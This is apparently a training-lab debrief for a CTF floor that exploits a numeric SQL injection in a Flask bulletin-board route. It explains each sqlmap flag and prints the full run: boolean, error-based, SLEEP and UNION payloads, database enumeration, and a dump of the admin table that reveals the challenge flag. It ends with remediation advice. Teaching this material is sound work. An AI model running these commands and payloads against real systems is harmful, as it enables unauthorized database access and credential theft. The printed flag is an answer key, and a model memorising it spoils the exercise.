# A Sealed Floor, Debrief

**Node:** `p2_2` &middot; **Flag:** `SEIYAKU{an_old_forgotten_door}` &middot; **Route:** `GET /p2/sealed` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`cms_news` table, `cms_admin` table)

## Root cause

The bulletin-board lookup builds its query with raw f-string
concatenation, against a bare, unquoted numeric `id`:

```python
# challenges/phase2.py
q = f"SELECT id, title, body, author FROM cms_news WHERE id={news_id}"  # VULN: string concat
cur.execute(q)
rows = cur.fetchall()
```

Every Phase 1 floor needed a closing `'` to break out of a string
literal first. This one needs nothing at all, `id` sits directly in
numeric context, so anything that's still valid SQL after the number
(`AND`, `OR`, `UNION`, a subquery) rides straight into the query with no
quote-escaping required. That single detail, a plain, unquoted numeric
parameter, is exactly the shape every SQLi scanner's default heuristics
are built to try first, and it happens to leave four independent
channels open through the same parameter at once:

- **boolean-blind**, `id=1 AND 1=1` renders the matching post; `id=1
  AND 1=2` renders nothing. Two distinguishable pages, no error needed.
- **error-based**, a malformed injection throws a raw MariaDB
  exception, and (same house style as p1_2) that raw exception text is
  echoed straight back to the page.
- **UNION-based**, the query's result set is rendered directly into the
  page, so a matching `UNION SELECT` surfaces attacker-chosen values as
  ordinary rows, same technique as p1_3.
- **time-based blind**, `id=1 AND SLEEP(N)` (or the stacked/subquery
  variants sqlmap prefers) delays the response with zero visible
  difference in the page, same technique as p1_5.

`cms_admin`, the module's old admin login, carried over unrotated from
whatever install first stood this module up, is never touched by any
query `/p2/sealed` constructs on its own. It only surfaces by riding the
`id` injection into a `UNION SELECT` / subquery against it.

This floor's lesson isn't a new SQL technique, it's that a single,
boring-looking parameter like this can carry every technique from Phase
1 at once, and that a working scanner finds all of them faster than
picking one by hand ever could. It's also a stand-in for a whole
real-world category of bug: this exact URL shape (a `page` selector plus
a record `id`) is how a lot of aging, unauthenticated content-management
modules were built before parameterized queries were the obvious
default, and never revisited once they were, more on that below.

## New to sqlmap? Read this once (every flag explained)

This is the first floor in the lab solved with `sqlmap` instead of a
hand-crafted payload, so here's what the tool actually is and what every
flag in this debrief does. Later Phase 2 floors assume you've read this
and only explain the flags that are new.

**What sqlmap actually is.** It's a program that automates everything the
earlier floors in this lab did by hand: given a request that might be
vulnerable, it tries a large, systematic list of known SQL injection
payloads against it, and if one works, it can then walk the database for
you, list what databases and tables exist, and pull out the data inside
them, all without you typing a single payload yourself. Nothing about
what it *finds* is different from p1_1 through p1_5; the difference is
that sqlmap tries every technique from those floors automatically,
instead of you picking one and hand-writing it.

**Pointing sqlmap at a target.** Two ways, both meaning "here is the
request to test":

- `-u "http://host/path?id=1"`, a bare URL. Quick, and fine for a simple
  GET request with no login, no cookies, nothing special.
- `-r req.txt`, replay a complete request saved to a file (method,
  headers, cookies, POST body, all of it). This lab mostly uses `-r`
  because several floors need something a bare URL can't carry (a
  session cookie, a POST body); see "Saving the request" below for what
  that file looks like.

**`-p id`**: which parameter to actually test. Without `-p`, sqlmap tries
to guess which parameters on the page look worth testing; naming one
directly is faster and removes any ambiguity, this floor's URL has two
parameters (`page` and `id`) so being explicit matters here more than it
would on a single-parameter page.

**`--batch`**: sqlmap normally stops and asks interactive yes/no
questions as it works ("do you want to test for other DBMSes too?
[Y/n]"), waiting for a human to answer. `--batch` tells it to just take
the default answer to every question instead of stopping, which is what
lets it run inside a script (or this lab's solvers) with nobody watching
it.

**`--ignore-stdin`**: a non-interactive-automation gotcha, covered in its
own callout just below. Every command in this debrief includes it for
that reason.

**`-v 1`**: the verbosity level, how much sqlmap prints while it works.
It ranges 0 (almost silent, critical messages only) to 6 (shows the
literal HTTP requests and every payload it tries, character for
character). `1`, the default, prints one info line per test it runs,
enough to follow along without drowning in raw traffic; the transcript
in "Step 1" below is exactly that level of output.

**Enumeration flags**, once sqlmap has confirmed an injection, these
walk the database the same way you'd browse a filesystem, one level at a
time:

| Flag | What it asks the database |
|---|---|
| `--dbs` | "What databases exist that this account can see?" |
| `-D <name>` | "For every command from here on, work inside this database." |
| `--tables` | "What tables are inside the database I selected?" |
| `-T <name>` | "For every command from here on, work inside this table." |
| `--columns` | "What columns (and their types) does the table I selected have?" |
| `--dump` | "Pull out the actual row data from the table/columns I selected." |

`--dump` is the one that actually extracts data; everything above it is
narrowing down *where* to point that extraction. `-D`/`-T` are optional,
if you skip them, sqlmap falls back to whatever database/table the
request's own query already uses.

**`--banner`**: a one-off recon command, "ask the database to state its
own version string," useful early on but not required to solve anything.

**`--technique`, `--level`, `--risk`** control *which* injection methods
sqlmap tries and how aggressively; they get their own full explanation
further down this debrief, after the walk.

## The technique: driving sqlmap instead of hand-crafting payloads

Every Phase 1 debrief walked a payload by hand. This floor (and every
floor after it in Phase 2) is solved by driving a tool through its
standard workflow instead. The shape of that workflow never changes,
target to target:

1. **Give sqlmap the request.** Either a URL (`-u "http://host/path?id=1"`)
   or, more realistically for anything behind auth/cookies/custom
   headers, a raw HTTP request saved to a file and replayed with `-r`.
2. **Point it at the parameter and let it confirm the injection.**
   `-p id` tells it which parameter to test; `--batch` answers every
   interactive prompt with the default so it runs unattended.
3. **Enumerate downward once it confirms.** `--dbs` -> `-D <db>
   --tables` -> `-D <db> -T <table> --columns` -> `-D <db> -T <table>
   --dump`. Each step narrows scope using what the previous step found.

### Saving the request

```
GET /p2/sealed?page=news&id=1 HTTP/1.1
Host: localhost:8000
User-Agent: seiyaku-arc-solver
Accept: */*
Connection: close

```

(this is exactly what `solvers/p2_2.sh` writes to a temp file before
calling sqlmap.)

### A gotcha worth knowing: `--ignore-stdin`

Running sqlmap non-interactively (from a script, CI, or anywhere stdin
isn't an attached terminal) needs one extra flag that isn't obvious from
the docs. When stdin isn't a TTY, sqlmap treats it as an *alternative*
target-list source (so you can pipe in a list of URLs), and with `-r`
already supplying the target, that stdin-pipe path races it, hits EOF
immediately, and sqlmap exits having never actually scanned anything
(no error, just a suspiciously instant "ending @ ..."). `--ignore-stdin`
forces `-r`'s request file to be the sole target source. Every command
below includes it for exactly this reason, worth remembering any time
sqlmap is driven from automation instead of an interactive shell.

### Step 1, confirm the injection

```
sqlmap -r req.txt -p id --batch --ignore-stdin -v 1
```

Real output from this exact seed:

```
[13:42:07] [INFO] parsing HTTP request from 'req.txt'
[13:42:07] [INFO] testing connection to the target URL
[13:42:07] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:42:07] [INFO] testing if the target URL content is stable
[13:42:07] [INFO] target URL content is stable
[13:42:07] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:42:07] [INFO] testing for SQL injection on GET parameter 'id'
[13:42:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:42:08] [WARNING] reflective value(s) found and filtering out
[13:42:08] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Old")
[13:42:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:42:08] [INFO] GET parameter 'id' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable
[13:42:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:42:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[13:42:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:42:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns.
[13:42:19] [INFO] target URL appears to have 4 columns in query
[13:42:19] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable

sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: page=news&id=1 AND 1001=1001

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: page=news&id=1 AND EXTRACTVALUE(6843,CONCAT(0x5c,0x7162626271,(SELECT (ELT(6843=6843,1))),0x7170717171))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: page=news&id=1 AND (SELECT 4964 FROM (SELECT(SLEEP(5)))BtXT)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: page=news&id=1 UNION ALL SELECT NULL,CONCAT(0x7162626271,0x7a65796e74785777446a6c5a54796f726743615679557666614275684c666b4a7575547a75676376,0x7170717171),NULL,NULL-- -
---
[13:42:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.1 (MariaDB fork)
```

(Real, live run against this exact seed. Note all four techniques from
the root-cause section above, found by sqlmap's plain defaults, zero
`--level`/`--risk`/`--technique` tuning, and note the `page=news&id=...`
payloads in the transcript, sqlmap is injecting into `id` while carrying
`page=news` along for the ride, since both are GET params on the same
request.)

### Step 2, enumerate databases

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dbs
```

```
available databases [2]:
[*] information_schema
[*] seiyaku_p2_sealed
```

Only this floor's own database is visible. Each challenge runs in its own
database behind its own restricted user, so the account this injection
runs through cannot see any other floor's database (see the Isolation
note at the end). There is no shared `seiyaku` schema here.

### Step 3, enumerate tables in `seiyaku_p2_sealed`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_sealed --tables
```

```
Database: seiyaku_p2_sealed
[3 tables]
+-----------+
| cms_admin |
| cms_news  |
| cms_pages |
+-----------+
```

`cms_news` and `cms_pages` back this floor's own display pages;
`cms_admin` is the one name this route's own code never selects from or
joins against, which is exactly why it's the interesting one. All three
belong to this floor, nothing from any other challenge is reachable.

### Step 4, enumerate columns of `cms_admin`

```
sqlmap -r req.txt -p id --batch --ignore-stdin -D seiyaku_p2_sealed -T cms_admin --columns
```

```
Database: seiyaku_p2_sealed
Table: cms_admin
[3 columns]
+---------------+--------------+
| Column        | Type         |
+---------------+--------------+
| id            | int(11)      |
| password_hash | varchar(128) |
| username      | varchar(32)  |
+---------------+--------------+
```

### Step 5, dump it

```
sqlmap -r req.txt -p id --batch --ignore-stdin --dump -T cms_admin
```

```
[13:41:16] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[13:41:16] [INFO] fetching current database
[13:41:16] [INFO] fetching columns for table 'cms_admin' in database 'seiyaku_p2_sealed'
[13:41:16] [INFO] fetching entries for table 'cms_admin' in database 'seiyaku_p2_sealed'
Database: seiyaku_p2_sealed
Table: cms_admin
[1 entry]
+----+----------+--------------------------------+
| id | username | password_hash                  |
+----+----------+--------------------------------+
| 1  | admin    | SEIYAKU{an_old_forgotten_door} |
+----+----------+--------------------------------+
```

(This is a real, live run against this exact stack, not a hypothetical
transcript, and is exactly the command `solvers/p2_2.sh` runs.)

## `--technique`, `--level`, `--risk`, and why defaults were enough here

**`--technique`** picks which detection families sqlmap will try, as a
string of letters:

| Letter | Technique |
|---|---|
| `B` | Boolean-based blind |
| `E` | Error-based |
| `U` | UNION query-based |
| `S` | Stacked queries |
| `T` | Time-based blind |
| `Q` | Inline queries |

The default is effectively "try all of them", this floor was built so
that default behavior alone (no `--technique` filtering at all) finds
`B`, `E`, `U`, and `T` in one pass, which is exactly what the transcript
above shows.

**`--level`** (1-5) controls *how many payloads* sqlmap tries per
technique, and where it looks for injectable parameters, higher levels
add tests against cookies, the `User-Agent`/`Referer` headers, and more
exotic payload variants, on top of GET/POST parameters. **`--risk`**
(1-3) controls how *aggressive* those payloads are allowed to be, risk 2
adds time-based payloads that can noticeably slow a target, risk 3 adds
payloads that include `OR`-based conditions capable of matching (and, in
the wrong context, updating) far more rows than intended, plus
heavier-handed boolean tests.

Both default to `1`. Nothing above required raising either, the
injection point, all four techniques, and the full enumeration chain all
came from sqlmap's out-of-the-box defaults.

**Why `--level 5 --risk 3` against a real client is a red flag, not a
power move:** cranking both to max multiplies the request count by
roughly an order of magnitude (every extra header, every extra payload
variant, every extra technique gets tried against every parameter), which
against a production target means far more noise in logs/WAF/IDS
alerting, a real chance of tripping rate limits or account lockouts
(especially against login-shaped parameters), and, this is the risk-3
part specifically, payloads deliberately chosen because they're more
likely to affect rows beyond the one being tested. Running max
level/risk against a system you don't have explicit, scoped authorization
to test that aggressively is exactly the kind of thing that turns an
authorized engagement into an incident. The professional default is the
same one sqlmap ships with: start at `--level 1 --risk 1`, and only raise
either deliberately, against a scope that's been explicitly cleared for
it, once the lower setting has been given a real chance to work, which,
as this floor demonstrates, is most of the time.

## What a CVE actually is, and why this floor references one

A CVE (Common Vulnerabilities and Exposures) entry is a public,
uniquely-numbered record that says, in effect: *this specific software,
at this version, has this class of flaw, and here's roughly how it's
triggered.* It's an advisory, not a walkthrough, CVE records typically
describe the vulnerable component and parameter, sometimes a proof-of-
concept request, but rarely a fully weaponized exploit. Turning a CVE
into a working payload against a real target is exactly the skill this
floor is built to practice: read what the advisory says the shape of the
bug is, then go confirm it exists and see what it actually yields.

This floor is modeled on the real-world pattern behind
**CVE-2015-3933** (GeniX CMS): a legacy content-management system with
an unauthenticated, GET-parameter-driven SQL injection in one of its
content-lookup pages, the classic "old CMS module, numeric `id` in the
URL, never parameterized" shape. This lab doesn't reproduce GeniX CMS's
original PHP source (this app is Python/Flask, not PHP, and the actual
vulnerable file/parameter names differ), what it reproduces is the
*pattern* the CVE describes: a dated, page-plus-id URL structure,
pre-auth, string-built SQL, sitting in a module nobody has had a reason
to open in years. Reading an advisory like this one is a skill in
itself: recognizing "unauthenticated legacy CMS + GET id parameter +
SQLi" as a shape you can go looking for, rather than needing the exact
original code in front of you.

## Why "old, forgotten code rots"

This floor's entire premise is that the vulnerability isn't new, clever,
or hidden behind some elaborate trick, it's *old*. Software that stops
receiving attention doesn't become safer by sitting still; the rest of
the world keeps moving. Query-building conventions that were once
unremarkable ("just concatenate the id, it's a number") become known-bad
practice. Frameworks patch their defaults. Security research catches up
and publishes CVEs against the specific products that never got the
memo. Meanwhile the module itself, like this bulletin board, keeps
running, unauthenticated, answering requests exactly the way it did the
day it was deployed, because nobody had a reason to open it again once
it stopped mattering to anyone's day-to-day.

This is precisely why CVE databases matter to attackers and defenders
alike: they're a running list of "software that's still out there,
running the same old code, with a documented way in." An attacker
doesn't need to discover a new bug when an old one, in a component
nobody retired, is a public, searchable fact. The uncomfortable
corollary for defenders is that "we haven't touched that module in
years" is not the same claim as "that module is safe", it's often the
opposite.

## HxH analogy

Trick Tower's whole design leans on applicants following its rules at
human speed, one floor, one rule, one attempt at a time. Every floor's
rule was written by someone who tested it the same slow way it expects
everyone else to test it. Nothing about the tower's rules changes if the
thing testing them isn't a person at all: a tool that tries every known
technique, every parameter, every combination, in the time it takes a
human to read the rule board, isn't cheating the tower's own logic. It's
just moving through the same rule set faster than the tower's author
ever accounted for. sqlmap is that tool for SQL injection specifically:
a systematic, exhaustive checklist of every known technique, run against
every reachable parameter, far faster than working through them by hand
one at a time, the way the Silent Room (p1_4) and the Medical Bay (p1_5)
each demanded.

Trick Tower's floors are usually described as puzzles built by design,
rules laid out on purpose, for applicants to solve on purpose. This
floor isn't one of those. It's a floor the tower's current staff didn't
build, don't maintain, and mostly don't remember exists: a leftover from
an earlier version of the tower, sealed off not because someone
engineered a trap, but because nobody thought to open the door and
check what was still running behind it. The weakness here isn't a
deliberate test of the applicant. It's the ordinary, unglamorous kind of
danger that accumulates in anything old enough to be forgotten about.

## Remediation

- **Parameterized queries, always**, identical fix to every floor in
  this lab:

  ```python
  cur.execute(
      "SELECT id, title, body, author FROM cms_news WHERE id=%s",
      (news_id,),
  )
  ```

  With `news_id` passed as a bound parameter, it can never be re-parsed
  as SQL grammar, `AND`, `UNION`, `SLEEP`, `EXTRACTVALUE`, all of it
  depend entirely on attacker text reaching the query as *code* rather
  than *data*, which parameterization removes as a possibility outright.
- **Patch and upgrade unmaintained dependencies, or retire them.** The
  real lesson this floor stands in for: an old CMS module (or library,
  or plugin, or vendored dependency) that nobody has updated is not
  neutral risk, it's accumulating risk. If a component has a public CVE
  and no maintained upgrade path, the two real options are patching it
  (backport the fix, or replace the vulnerable code path directly) or
  decommissioning it outright, "leave it running because nobody uses
  it anymore" is exactly the state this floor is built to exploit,
  because "nobody uses it" and "nothing can reach it" are not the same
  claim.
- **Track what's actually deployed.** You can't patch a known CVE in a
  component you've forgotten is running. An asset/dependency inventory,
  even an informal one, is what turns "there's a public advisory
  against X" into "we know we're running X, and we know where."
  Without it, a public CVE against a component sitting quietly in
  production is a door nobody remembered leaving open.
- **Least-privilege database accounts.** Even a fully successful
  injection here should never be able to reach a table like `cms_admin`
  that this route's own legitimate queries never touch. A DB user
  scoped to only the tables a route actually needs turns "the query can
  technically ask this" into "the query is rejected before it ever
  runs", the single highest-leverage mitigation in this whole lab.
- **Defense-in-depth beyond the code fix.** Fixing the immediate query
  is necessary but not sufficient on a real system: a WAF tuned to flag
  the same payload shapes sqlmap generates (`UNION SELECT`,
  `EXTRACTVALUE(`, `SLEEP(`, stacked `;`), least-privilege DB accounts
  as above so a missed injection point still can't reach sensitive
  tables, and monitoring/alerting on abnormal query volume or timing all
  reduce the blast radius of the *next* bug, not just this one. A
  scanner as capable as sqlmap being freely available to attackers is
  exactly why "we fixed the one bug we know about" was never the finish
  line.

## Isolation

This floor lives in its own database (`seiyaku_p2_sealed`) and connects
as its own restricted user (`svc_p2_sealed`), granted access to nothing
else. That is why `--dbs` and `--tables` above returned only this floor's
own database and its three tables: `information_schema` is filtered by
the connecting user's privileges, so other challenges' tables are
invisible, not just unreferenced, and cross-database reads or `USE` of
another challenge's database are denied outright. `cms_admin` is still
reachable here because it lives in *this* challenge's own database
alongside `cms_news`/`cms_pages`, that within-challenge exposure is the
whole lesson; what you cannot do is reach any *other* challenge's tables.
(Every MariaDB-backed challenge in the lab is isolated the same way.)
